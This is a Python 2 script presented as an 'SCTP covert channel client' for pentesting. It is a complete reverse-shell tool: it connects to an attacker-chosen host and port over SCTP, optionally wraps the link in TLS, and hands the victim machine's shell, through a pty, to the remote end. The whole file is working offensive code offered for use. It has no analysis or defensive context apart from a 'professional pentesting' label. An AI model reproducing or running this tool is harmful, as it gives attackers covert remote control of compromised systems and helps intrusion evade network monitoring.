#!/usr/bin/python2
import                      argparse
from Crypto.Cipher import   AES
import                      fcntl
import                      os
import                      pty
import                      sctp
import                      socket
import                      ssl
import                      sys
from subprocess import      Popen, PIPE
import                      threading

sctp_socket         = sctp.sctpsocket_tcp

# DISCLAIMER: this code is largely copied and refactored from gallopsled's excellent pwntools. 
# Hat tip to them.
def interactive_recv_input(sock, std_in, bye_bye):
    while not bye_bye.isSet():
        # receive data and give it to the program's input:
        try:
            cur_data = sock.recv(1024)
            if cur_data:
                std_in.write(cur_data)
                std_in.flush()
        except EOFError:
            print "EOF - terminating"
            sys.exit(0)

def interactive_send_output(sock, std_out, bye_bye):
    try:
        while not bye_bye.isSet():
            try:
                data = std_out.read()
            except IOError:
                continue
            if data:
                try:
                    sock.send(data)
                except (EOFError, socket.error) as e:
                    print "EOF - terminating"
                    bye_bye.set()
            else:
                bye_bye.set()
    except KeyboardInterrupt:
        print "CTRL + C pressed."
        bye_bye.set()

def process_connection(sock, std_in, std_out, disable_encryption = False):
    # connect connection's stdin to my stdin, connection's stdout to my stdout.
    bye_bye     = threading.Event()

    read_thread = threading.Thread(target = interactive_recv_input, args = (sock, std_in, bye_bye))
    read_thread.setDaemon(True)
    read_thread.start()

    interactive_send_output(sock, std_out, bye_bye)

    while read_thread.is_alive():
        read_thread.join(timeout = 0.1)

# END DISCLAIMER

def connect(host, port, disable_encryption = False):
    sock            = sctp_socket(family = socket.AF_INET)
    sock.connect((host, port))
    if disable_encryption:
        std_out         = sock.sock().makefile("w")
        std_in          = sock.sock().makefile()
        shell = Popen(os.environ["SHELL"],
                      stdin     = std_in,
                      stdout    = std_out,
                      shell     = True)

    else:
        ssl_sock        = ssl.wrap_socket(sock.sock(),
                                          ssl_version = ssl.PROTOCOL_TLSv1)
        ssl_sock.send("Hi! This is the client. You're connected.\n")

        pipes   = os.pipe()
        std_in  = os.fdopen(pipes[0], "r")
        std_out = os.fdopen(pipes[1], "w")

        #Set our shell up to use pty, and make the output non-blocking.
        master, slave = pty.openpty()
        shell = Popen(os.environ["SHELL"],
                      stdin     = PIPE,
                      stdout    = slave,
                      shell     = True)
        shell.stdout = os.fdopen(os.dup(master), "r+")
        fd = shell.stdout.fileno()
        fl = fcntl.fcntl(fd, fcntl.F_GETFL)
        fcntl.fcntl(fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)
        process_connection(ssl_sock, shell.stdin, shell.stdout, disable_encryption)

    sock.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description = ("SCTP covert channel client. "
                                     "FOR PROFESSIONAL PENTESTING USE ONLY."))
    parser.add_argument("--host",
                        required    = True,
                        help        = "Server IP address.")
    parser.add_argument("--port",
                        required    = True,
                        help        = "Server port.",
                        type        = int)
    parser.add_argument("--no-encryption",
                        help        = "FOR DEBUGGING ONLY. Disables encryption",
                        action      = "store_true")
    args = parser.parse_args()
    connect(host = args.host, port = args.port, disable_encryption = args.no_encryption)
